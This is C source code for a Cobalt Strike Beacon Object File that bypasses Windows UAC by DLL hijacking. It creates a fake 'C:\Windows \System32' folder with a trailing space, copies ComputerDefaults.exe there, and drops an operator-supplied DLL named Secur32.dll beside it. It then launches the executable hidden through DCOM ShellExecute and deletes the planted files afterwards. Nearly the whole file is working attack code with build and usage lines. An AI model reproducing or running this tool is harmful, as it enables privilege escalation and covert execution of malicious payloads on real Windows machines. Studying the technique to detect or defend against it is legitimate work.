//x86_64-w64-mingw32-gcc -c TrustedPathDLLHijackBOF.c -w -o /share/test.o
// Usage: .\COFFLoader64.exe go .\test.o 130000000f0000006d657373616765626f782e646c6c00
#include <windows.h>
#include <wtsapi32.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <combaseapi.h>
#include <heapapi.h>
#include "beacon.h"

// define required winapi functions
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryW(LPCTSTR, LPSECURITY_ATTRIBUTES);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CopyFileA(LPCTSTR, LPCTSTR, BOOL);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$RemoveDirectoryA(LPCSTR);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsA(LPCSTR pszPath);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI SHLWAPI$PathFileExistsW(LPCTSTR);
WINBASEAPI wchar_t WINAPI MSVCRT$wcscat(wchar_t * destination, const wchar_t * source);
WINBASEAPI LPSTR WINAPI MSVCRT$strcat(char *strDestination, const char *strSource);
WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINOLEAPI OLE32$CoInitialize(LPVOID pvReserved);
DECLSPEC_IMPORT WINOLEAPI OLE32$CLSIDFromString(LPCOLESTR lpsz, LPCLSID pclsid);
DECLSPEC_IMPORT WINOLEAPI OLE32$CoCreateInstanceEx(REFCLSID, IUnknown*,DWORD,COSERVERINFO*, DWORD,MULTI_QI*);
DECLSPEC_IMPORT WINBASEAPI void * WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT HRESULT WINAPI OLE32$IIDFromString(wchar_t * lpsz, LPIID lpiid);
DECLSPEC_IMPORT WINOLEAPI_(void) OLE32$CoUninitialize(void);
DECLSPEC_IMPORT WINOLEAUTAPI_(BSTR) OleAut32$SysAllocString(const OLECHAR *);
WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

// main function
void go(char * args, unsigned long length)
{
    // get arguments
    datap parser;
    size_t dwBytesToWrite;
    BeaconDataParse(&parser, args, length);
    dwBytesToWrite = BeaconDataInt(&parser);
    unsigned char * DataBuffer = BeaconDataExtract(&parser, NULL);

    DWORD errorcode;

    // Initialize and define strings
    char * targetProc = "ComputerDefaults.exe"; // This is the EXE that will be copied and executed
    char * DLL = "Secur32.dll"; // name of hijackable DLL that corresponds to above EXE
    char originalLocation[100] = {0};
    char newLocation[100] = {0};
    char newDLLLocation[100] = {0};
    char fakeWindowsFolder[100] = {0};
    char fakeSystem32Folder[100] = {0};
    MSVCRT$strcat(originalLocation, "C:\\Windows\\System32\\");
    MSVCRT$strcat(originalLocation, targetProc);
    MSVCRT$strcat(newLocation, "C:\\Windows \\System32\\");
    MSVCRT$strcat(newLocation, targetProc);
    MSVCRT$strcat(newDLLLocation, "C:\\Windows \\System32\\");
    MSVCRT$strcat(newDLLLocation, DLL);
    MSVCRT$strcat(fakeWindowsFolder, "C:\\Windows \\");
    MSVCRT$strcat(fakeSystem32Folder, "C:\\Windows \\System32\\");

    if(!SHLWAPI$PathFileExistsA((LPCSTR)originalLocation)){
        BeaconPrintf(CALLBACK_ERROR, "The target executable does not exist in \"C:\\Windows\\System32\".");
        return;
    }

    // Create "C:\Windows \System32" directory
    KERNEL32$CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\", 0);
    KERNEL32$CreateDirectoryW((LPCTSTR)L"\\\\?\\C:\\Windows \\System32\\", 0);
    BeaconPrintf(CALLBACK_OUTPUT, "Created fake windows directories\n");

    // Copy the target executable to "C:\Windows \System32"
    KERNEL32$CopyFileA((LPCTSTR)originalLocation, (LPCTSTR)newLocation, FALSE);
    errorcode = KERNEL32$GetLastError();
    if(errorcode!=0){
        if(errorcode==32){
            BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy the executable to the destination because it is running by another program. Please kill the process and retry.\n", KERNEL32$GetLastError());
        }else{
            BeaconPrintf(CALLBACK_ERROR, "Error %d: Could not copy the executable to the destination.\n", KERNEL32$GetLastError());
        }   
        goto FileCleanup;
        return;
    }else{
        BeaconPrintf(CALLBACK_OUTPUT, "Executable copied successfully.\n");
    }

    // write supplied DLL to "C:\Windows \System32" directory
    HANDLE hFile;
    DWORD dwBytesWritten = 0;
    BOOL bErrorFlag = FALSE;
    hFile = KERNEL32$CreateFileA(newDLLLocation, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        BeaconPrintf(CALLBACK_OUTPUT, "Unable to open file \"%s\" for write.\n", newDLLLocation);
        return;
    }
    bErrorFlag = KERNEL32$WriteFile(hFile, DataBuffer, dwBytesToWrite, &dwBytesWritten, NULL);
    if (FALSE == bErrorFlag)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "Unable to write to file.\n");
        return;
    }
    else {
        if (dwBytesWritten != dwBytesToWrite)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Error: dwBytesWritten != dwBytesToWrite\n");
            return;
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Wrote %d bytes to %s successfully.\n", dwBytesWritten, newDLLLocation);
        }
    }
    KERNEL32$CloseHandle(hFile);
    
    // The full DCOM execution all credit to @Yas_o_h for his DCOM BOF implementation (https://raw.githubusercontent.com/Yaxser/CobaltStrike-BOF/6fe9cc139632c8301c207ea27e4859d7224418b9/DCOM%20Lateral%20Movement/BOF-IShellWindows-DCOM.c)
    HRESULT hr = S_OK;
    IID Ipsb, Ipsv, Ipsw, Ipsfvd, Ipdisp, IpdispBackground, ISHLDISP, IshellWindowCLSID, ITopLevelSID, servicerprovider_iid;
    HWND hwnd;
    IShellBrowser* psb;
    IShellView* psv;
    IShellWindows* psw;
    IShellFolderViewDual* psfvd;
    IShellDispatch2* psd;
    IDispatch* pdisp, * pdispBackground;
    IServiceProvider* svsProvider;
    VARIANT vEmpty = { vEmpty.vt = VT_I4, vEmpty.lVal = 0 };

    hr = OLE32$CoInitialize(NULL);
    if (!SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitialize failed: 0x%08lx", hr);
        goto FileCleanup;
        return;
    }

    wchar_t* ShellBrowserI = L"{000214E2-0000-0000-C000-000000000046}";
    wchar_t* ShellViewI = L"{000214E3-0000-0000-C000-000000000046}";
    wchar_t* ShellWindowsI = L"{85CB6900-4D95-11CF-960C-0080C7F4EE85}";
    wchar_t* ShellFolderViewDualI = L"{E7A1AF80-4D96-11CF-960C-0080C7F4EE85}";
    wchar_t* Dispatch_I = L"{00020400-0000-0000-C000-000000000046}";
    wchar_t* ShellDispatch_I = L"{A4C6892C-3BA9-11D2-9DEA-00C04FB16162}";
    wchar_t* ShellWindowCLSID = L"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}";
    wchar_t* TopLevelBrowserSID = L"{4C96BE40-915C-11CF-99D3-00AA004AE837}";
    wchar_t* ServiceProviderI = L"{6D5140C1-7436-11CE-8034-00AA006009FA}";
    
    OLE32$IIDFromString(ShellBrowserI, &Ipsb);
    OLE32$IIDFromString(ShellViewI, &Ipsv);
    OLE32$IIDFromString(ShellWindowsI, &Ipsw);
    OLE32$IIDFromString(ShellFolderViewDualI, &Ipsfvd);
    OLE32$IIDFromString(ShellFolderViewDualI, &IpdispBackground);
    OLE32$IIDFromString(Dispatch_I, &Ipdisp);
    OLE32$IIDFromString(ShellDispatch_I, &ISHLDISP);
    OLE32$CLSIDFromString(ShellWindowCLSID, &IshellWindowCLSID);
    OLE32$CLSIDFromString(TopLevelBrowserSID, &ITopLevelSID);
    OLE32$IIDFromString(ServiceProviderI, &servicerprovider_iid);
    
    const GUID GUID_NULL = { 0, 0, 0, { 0, 0, 0, 0, 0, 0, 0, 0 } };

    COSERVERINFO* srvinfo = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COSERVERINFO));
    COAUTHINFO* authInfo = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
    COAUTHIDENTITY* authidentity = NULL;
    MULTI_QI mqi[1] = { &Ipsw, NULL, hr };

    authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
    authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
    authInfo->pwszServerPrincName = NULL;
    authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
    authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
    authInfo->dwCapabilities = EOAC_NONE;
    srvinfo->dwReserved1 = 0;
    srvinfo->dwReserved2 = 0;
    srvinfo->pAuthInfo = authInfo;

    hr = OLE32$CoCreateInstanceEx(&IshellWindowCLSID, NULL, CLSCTX_LOCAL_SERVER, srvinfo, 1, mqi);

    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstanceEx failed: 0x%08lx", hr);
        goto FileCleanup;
        return;
    }

    hr = mqi->pItf->lpVtbl->QueryInterface(mqi->pItf, &Ipsw, (void**)&psw);

    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "ShellWindows->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = mqi->pItf->lpVtbl->Release(mqi->pItf);
    
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "Releaseing IShellWindows failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psw->lpVtbl->FindWindowSW(psw, &vEmpty, &vEmpty, SWC_DESKTOP, (long*)&hwnd, SWFO_NEEDDISPATCH, &pdisp);

    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "FindWindowSW failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = pdisp->lpVtbl->QueryInterface(pdisp, &servicerprovider_iid, (void**)&svsProvider);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "pdisp->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = svsProvider->lpVtbl->QueryService(svsProvider, &ITopLevelSID, &Ipsb, (void**)&psb);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "pdisp->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psb->lpVtbl->QueryActiveShellView(psb, &psv);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "psb->QueryActiveShellView failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psv->lpVtbl->GetItemObject(psv, SVGIO_BACKGROUND, &Ipdisp, (void**)&pdispBackground);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "psv->GetItemObject failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = pdispBackground->lpVtbl->QueryInterface(pdispBackground, &Ipsfvd, (void**)&psfvd);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "pdispBackground->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = psfvd->lpVtbl->get_Application(psfvd, &pdisp);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "psfvd->get_Application failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    hr = pdisp->lpVtbl->QueryInterface(pdisp, &ISHLDISP, (void**)&psd);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "pdisp->QueryInterface failed: 0x%08lx", hr);
        goto Cleanup;
        goto FileCleanup;
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Executing \"%s\"...\n", newLocation);
    wchar_t* newLocationWide =  (wchar_t*)MSVCRT$malloc(100);
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, newLocation, -1, newLocationWide, 100);
    BSTR bstrFile = OleAut32$SysAllocString(newLocationWide);

    VARIANT vOperation;
    vOperation.vt = VT_BSTR;
    vOperation.bstrVal = OleAut32$SysAllocString(L"open");

    VARIANT vShow;
    vShow.vt = VT_INT;
    vShow.intVal = SW_HIDE;

    VARIANT vArgs;
    vArgs.vt = VT_BSTR;
    vArgs.bstrVal = OleAut32$SysAllocString(L"");

    VARIANT vDir;
    vDir.vt = VT_BSTR;
    vDir.bstrVal = OleAut32$SysAllocString(L"");

    psd->lpVtbl->ShellExecute(psd, bstrFile, vArgs, vDir, vOperation, vShow);
    if(!SUCCEEDED(hr)){
        BeaconPrintf(CALLBACK_ERROR, "psd->ShellExecute failed: 0x%08lx", hr);
    }

    goto Cleanup;
    goto FileCleanup;

    Cleanup:
    if(mqi->pItf != NULL){
        mqi->pItf->lpVtbl->Release(mqi->pItf);
    }
    if(psb != NULL){
        psb->lpVtbl->Release(psb);
    }
    if(psv != NULL){
        psv->lpVtbl->Release(psv);
    }
    if(psw != NULL){
        psw->lpVtbl->Release(psw);
    }
    if(psfvd != NULL){
        psfvd->lpVtbl->Release(psfvd);
    }
    if(pdisp != NULL){
        pdisp->lpVtbl->Release(pdisp);
    }
    if(pdispBackground != NULL){
        pdispBackground->lpVtbl->Release(pdispBackground);
    }
    if(svsProvider != NULL){
        svsProvider->lpVtbl->Release(svsProvider);
    }
    if(psd != NULL){
        psd->lpVtbl->Release(psd);
    }
    OLE32$CoUninitialize();

    FileCleanup:
    // Fake windows directory and files cleanup
    KERNEL32$Sleep(30000); // set this sleep to be for however long the DLL will execute for. 30 seconds is a good standard for use with something like Shhhloader.
    LPCSTR folderPath[2] = {newLocation, newDLLLocation};
    for (int i = 0; i < 2; i++) {
        int result = KERNEL32$DeleteFileA(folderPath[i]);
        if (result != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "File deleted succesfully: %s\n", folderPath[i]);
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to delete '%s' in the fake windows folder: %d\n", folderPath[i], KERNEL32$GetLastError());
        }
    }
    LPCSTR emptyFolders[2] = {fakeSystem32Folder, fakeWindowsFolder};
    for (int i = 0; i < 2; i++) {
        int result = KERNEL32$RemoveDirectoryA(emptyFolders[i]);
        if (result != 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Folder deleted succesfully: %s\n", emptyFolders[i]);
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to delete folder %s: %d\n", emptyFolders[i], KERNEL32$GetLastError());
        }
    }

    return;
};
